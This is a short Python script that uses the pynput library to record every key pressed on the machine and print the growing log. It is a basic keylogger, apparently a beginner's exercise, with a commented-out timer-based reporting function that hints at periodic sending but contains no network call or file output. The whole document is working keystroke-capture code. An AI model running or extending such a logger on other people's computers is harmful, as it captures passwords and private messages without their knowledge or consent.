import pynput.keyboard



log=""
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log+ " "
        else:
            log= log + " " +str(key) + " "

    print(log)

# def report():
#     global log
#     print(log)
#     log=""
#     timer = threading.Timer(5,report())
#     timer.start()
#


keyboard_listner = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listner:
    #report()
    keyboard_listner.join()